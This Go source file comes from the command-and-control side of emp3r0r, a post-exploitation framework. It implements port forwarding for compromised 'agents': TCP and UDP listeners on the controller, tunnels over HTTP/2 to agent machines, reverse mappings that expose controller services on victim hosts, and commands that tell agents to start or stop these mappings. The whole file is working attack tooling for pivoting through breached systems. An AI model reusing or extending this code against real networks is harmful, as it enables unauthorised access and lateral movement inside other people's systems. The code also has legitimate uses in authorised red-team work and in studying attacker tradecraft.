//go:build linux
// +build linux

package cc

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/olekukonko/tablewriter"
)

// PortFwdSession holds controller interface of a port-fwd session
type PortFwdSession struct {
	Protocol    string       // TCP or UDP
	Lport       string       // listen_port
	To          string       // to address
	Description string       // fmt.Sprintf("%s (Local) -> %s (Agent)", listenPort, to_addr)
	Reverse     bool         // from agent to cc or cc to agent
	Listener    *net.UDPConn // if mapping is UDP, we need its listener
	Timeout     int          // timeout in seconds

	Agent  *emp3r0r_data.AgentSystemInfo // agent who holds this port mapping session
	Sh     map[string]*StreamHandler     // related to HTTP handler
	Ctx    context.Context               // PortFwd context
	Cancel context.CancelFunc            // PortFwd cancel
}

type port_mapping struct {
	Id          string `json:"id"`          // portfwd id
	Agent       string `json:"agent"`       // agent tag
	Reverse     bool   `json:"reverse"`     // map (TCP) port from CC to agent
	Description string `json:"description"` // details
}

func headlessListPortFwds() (err error) {
	var mappings []port_mapping
	for id, portmap := range PortFwds {
		if portmap.Sh == nil {
			portmap.Cancel()
			continue
		}
		var permapping port_mapping
		permapping.Id = id
		permapping.Description = portmap.Description
		permapping.Agent = portmap.Agent.Tag
		permapping.Reverse = portmap.Reverse
		mappings = append(mappings, permapping)
	}
	data, err := json.Marshal(mappings)
	if err != nil {
		return
	}
	_, err = APIConn.Write([]byte(data))
	return
}

// DeletePortFwdSession delete a port mapping session by ID
func DeletePortFwdSession(cmd string) {
	cmdSplit := strings.Fields(cmd)
	if len(cmdSplit) != 2 {
		CliPrintError("delete_port_fwd <mapping id>")
		return
	}
	sessionID := cmdSplit[1]
	PortFwdsMutex.Lock()
	defer PortFwdsMutex.Unlock()
	for id, session := range PortFwds {
		if id == sessionID {
			err := SendCmd(fmt.Sprintf("%s --id %s", emp3r0r_data.C2CmdDeletePortFwd, id), "", session.Agent)
			if err != nil {
				CliPrintWarning("Tell agent %s to delete port mapping %s: %v", session.Agent.Tag, sessionID, err)
			}
			session.Cancel()
			delete(PortFwds, id)
		}
	}
}

// ListPortFwds list currently active port mappings
func ListPortFwds() {
	if IsAPIEnabled {
		err := headlessListPortFwds()
		if err != nil {
			CliPrintError("ListPortFwds: %v", err)
		}
	}

	// build table
	tdata := [][]string{}
	tableString := &strings.Builder{}
	table := tablewriter.NewWriter(tableString)
	table.SetHeader([]string{"Local Port", "To", "Agent", "Description", "ID"})
	table.SetBorder(true)
	table.SetRowLine(true)
	table.SetAutoWrapText(true)
	table.SetAutoFormatHeaders(true)
	table.SetReflowDuringAutoWrap(true)
	table.SetColWidth(10)

	// color
	table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiMagentaColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiBlueColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiCyanColor},
		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiYellowColor})

	table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiMagentaColor},
		tablewriter.Colors{tablewriter.FgHiCyanColor},
		tablewriter.Colors{tablewriter.FgBlueColor},
		tablewriter.Colors{tablewriter.FgHiCyanColor},
		tablewriter.Colors{tablewriter.FgYellowColor})

	for id, portmap := range PortFwds {
		if portmap.Sh == nil {
			portmap.Cancel()
			continue
		}
		to := portmap.To + " (Agent) "
		lport := portmap.Lport + " (CC) "
		if portmap.Reverse {
			to = portmap.To + " (CC) "
			lport = portmap.Lport + " (Agent) "
		}
		tdata = append(tdata,
			[]string{
				lport,
				to,
				util.SplitLongLine(portmap.Agent.Tag, 10),
				util.SplitLongLine(portmap.Description, 10),
				util.SplitLongLine(id, 10),
			})
	}

	// rendor table
	table.AppendBulk(tdata)
	table.Render()
	AdaptiveTable(tableString.String())
	fmt.Printf("\n\033[0m%s\n\n", tableString.String())
}

// InitReversedPortFwd send portfwd command to agent and set up a reverse port mapping
func (pf *PortFwdSession) InitReversedPortFwd() (err error) {
	toAddr := pf.To
	listenPort := pf.Lport

	_, e2 := strconv.Atoi(listenPort)
	if !tun.ValidateIPPort(toAddr) || e2 != nil {
		return fmt.Errorf("Invalid address/port: %s (to), %v (listen_port)", toAddr, e2)
	}

	// mark this session, save to PortFwds
	fwdID := uuid.New().String()
	pf.Sh = nil
	if pf.Description == "" {
		pf.Description = "Reverse mapping"
	}
	pf.Reverse = true
	pf.Agent = CurrentTarget
	PortFwdsMutex.Lock()
	PortFwds[fwdID] = pf
	PortFwdsMutex.Unlock()

	// tell agent to start this mapping
	cmd := fmt.Sprintf("%s --to %s --shID %s --operation reverse", emp3r0r_data.C2CmdPortFwd, listenPort, fwdID)
	err = SendCmd(cmd, "", CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	return
}

// RunReversedPortFwd expose service on CC side to agent, via h2conn
// as if the service is listening on agent machine
func (pf *PortFwdSession) RunReversedPortFwd(sh *StreamHandler) (err error) {
	// dial dest
	conn, err := net.Dial("tcp", pf.To)
	if err != nil {
		CliPrintWarning("RunReversedPortFwd failed to connect to %s: %v", pf.To, err)
		return
	}

	// clean up all goroutines
	cleanup := func() {
		_, _ = conn.Write([]byte("exit\n"))
		conn.Close()
		sh.H2x.Conn.Close()
		CliPrintDebug("PortFwd conn handler (%s) finished", conn.RemoteAddr().String())
		sh.H2x.Cancel() // cancel this h2 connection
	}

	// remember the agent
	pf.Agent = CurrentTarget
	pf.Reverse = true

	// io.Copy
	go func() {
		_, err = io.Copy(sh.H2x.Conn, conn)
		if err != nil {
			CliPrintDebug("RunReversedPortFwd: conn -> h2: %v", err)
			return
		}
	}()
	go func() {
		_, err = io.Copy(conn, sh.H2x.Conn)
		if err != nil {
			CliPrintDebug("RunReversedPortFwd: h2 -> conn: %v", err)
			return
		}
	}()

	// keep running until context is canceled
	defer cleanup()
	for sh.H2x.Ctx.Err() == nil {
		time.Sleep(500 * time.Millisecond)
	}

	return
}

// RunPortFwd forward from ccPort to dstPort on agent, via h2conn
// as if the dstPort is listening on CC machine
func (pf *PortFwdSession) RunPortFwd() (err error) {
	if pf.Protocol == "" {
		pf.Protocol = "tcp"
	}

	handleTCPConn := func(conn net.Conn, fwdID string) {
		/*
		   handle TCP connections to "localhost:listenPort"
		*/
		var (
			err   error
			sh    *StreamHandler
			exist bool
		)

		// wait for agent to connect
		for i := 0; i < 1e5; i++ {
			time.Sleep(time.Millisecond)
			sh, exist = pf.Sh[fwdID]
			if exist {
				break
			}
		}
		if !exist {
			err = errors.New("handlePerConn: timeout")
			return
		}

		// clean up all goroutines
		cleanup := func() {
			_, _ = conn.Write([]byte("exit"))
			conn.Close()
			sh.H2x.Conn.Close()
			CliPrintDebug("handlePerConn: %s finished", conn.RemoteAddr().String())
		}

		// io.Copy
		go func() {
			_, err = io.Copy(sh.H2x.Conn, conn)
			if err != nil {
				CliPrintDebug("handlePerConn: conn -> h2: %v", err)
				return
			}
		}()
		_, err = io.Copy(conn, sh.H2x.Conn)
		if err != nil {
			CliPrintDebug("handlePerConn: h2 -> conn: %v", err)
			return
		}

		// keep running until context is canceled
		defer cleanup()
	}

	/*
	   start port mapping
	*/

	ctx := pf.Ctx
	cancel := pf.Cancel
	toAddr := pf.To
	listenPort := pf.Lport

	// remember the agent
	pf.Agent = CurrentTarget

	_, e2 := strconv.Atoi(listenPort)
	if !tun.ValidateIPPort(toAddr) || e2 != nil {
		return fmt.Errorf("Invalid address/port: %s (to), %v (listen_port)", toAddr, e2)
	}

	var (
		udp_listener    *net.UDPConn
		tcp_listener    net.Listener
		udp_listen_addr *net.UDPAddr
	)
	switch pf.Protocol {
	case "tcp":
		// TCP listener
		tcp_listener, err = net.Listen("tcp", ":"+listenPort)
		if err != nil {
			return fmt.Errorf("RunPortFwd listen TCP: %v", err)
		}
	case "udp":
		// UDP listener
		udp_listen_addr, err = net.ResolveUDPAddr("udp", ":"+listenPort)
		if err != nil {
			return fmt.Errorf("RunPortFwd resolve UDP address: %v", err)
		}
		udp_listener, err = net.ListenUDP("udp", udp_listen_addr)
		if err != nil {
			return fmt.Errorf("RunPortFwd Listen UDP: %v", err)
		}
		pf.Listener = udp_listener // will be used in portFwdHandler
	}

	// send command to agent, with session ID
	fwdID := uuid.New().String()
	cmd := fmt.Sprintf("%s --to %s --shID %s --operation %s", emp3r0r_data.C2CmdPortFwd, toAddr, fwdID, pf.Protocol)
	err = SendCmdToCurrentTarget(cmd, "")
	if err != nil {
		return fmt.Errorf("SendCmd: %v", err)
	}
	CliPrintDebug("RunPortFwd (%s: %s) %s: %s to %s\n%s",
		pf.Description, fwdID, pf.Protocol, pf.Lport, pf.To, cmd)

	// mark this session, save to PortFwds
	pf.Sh = nil
	if pf.Description == "" {
		pf.Description = fmt.Sprintf("Agent to CC mapping (%s)", pf.Protocol)
	}
	PortFwdsMutex.Lock()
	PortFwds[fwdID] = pf
	PortFwdsMutex.Unlock()

	cleanup := func() {
		cancel()
		if tcp_listener != nil {
			tcp_listener.Close()
		}
		if udp_listener != nil {
			udp_listener.Close()
		}
		PortFwdsMutex.Lock()
		defer PortFwdsMutex.Unlock()
		delete(PortFwds, fwdID)
		CliPrintWarning("PortFwd session (%s) has finished:\n"+
			"%s: %s -> %s\n%s",
			pf.Description, pf.Protocol, pf.Lport, pf.To, fwdID)
	}

	// catch cancel event, and trigger the termination of parent function
	go func() {
		for ctx.Err() == nil {
			time.Sleep(1 * time.Second)
		}
		_, _ = net.Dial(pf.Protocol, "127.0.0.1:"+listenPort)
	}()

	defer cleanup()

	handleUDPPacket := func() {
		// read UDP to this buffer
		buf := make([]byte, 1024)
		n, udp_client_addr, e := udp_listener.ReadFromUDP(buf)
		if e != nil {
			CliPrintError("UDP Listener: %v", err)
			return
		}
		if n == 0 {
			return
		}
		client_tag := udp_client_addr.String()
		CliPrintDebug("UDP listener read %d bytes from %s", n, udp_client_addr.String())

		// create port mapping for each client connection
		shID := fmt.Sprintf("%s_%s-udp", fwdID, client_tag)
		cmd = fmt.Sprintf("%s --to %s --shID %s --operation %s --timeout %d",
			emp3r0r_data.C2CmdPortFwd, toAddr, shID, pf.Protocol, pf.Timeout)
		err = SendCmd(cmd, "", pf.Agent)
		if err != nil {
			CliPrintError("SendCmd: %v", err)
			return
		}

		// forward data from local UDP client to H2 connection
		var (
			sh    *StreamHandler
			exist bool
		)
		// wait for agent to connect
		for i := 0; i < 10000; i++ {
			util.TakeABlink()
			sh, exist = pf.Sh[shID]
			if exist {
				break
			}
		}
		if !exist {
			err = fmt.Errorf("UDP forwarding: timeout waiting for agent connection: %s", udp_client_addr.String())
			return
		}

		// forward data between UDP client and H2
		// UDP client to H2
		buf = buf[0:n]
		n, err = sh.H2x.Conn.Write(buf)
		if err != nil {
			CliPrintError("Write to H2: %v", err)
		}
		CliPrintDebug("%s sent %d bytes to H2", udp_client_addr.String(), n)
	}

	// receive TCP/UDP packets from local port
	// and forward them to H2
	for ctx.Err() == nil {
		p, exist := PortFwds[fwdID]
		if !exist {
			return
		}
		if p.Sh == nil {
			time.Sleep(100 * time.Millisecond)
			continue
		}

		switch pf.Protocol {
		case "udp":
			handleUDPPacket()
		case "tcp":
			// listen
			conn, e := tcp_listener.Accept()
			if e != nil {
				CliPrintError("Listening on port %s: %v", p.Lport, e)
			}
			// mark src port
			srcPort := strings.Split(conn.RemoteAddr().String(), ":")[1]

			go func() {
				// sub-session (streamHandler) ID
				shID := fmt.Sprintf("%s_%s", fwdID, srcPort)
				cmd = fmt.Sprintf("%s --to %s --shID %s --operation %s --timeout %d",
					emp3r0r_data.C2CmdPortFwd, toAddr, shID, pf.Protocol, pf.Timeout)
				err = SendCmd(cmd, "", pf.Agent)
				if err != nil {
					CliPrintError("SendCmd: %v", err)
					return
				}
				handleTCPConn(conn, shID)
			}()
		}
	}

	return
}
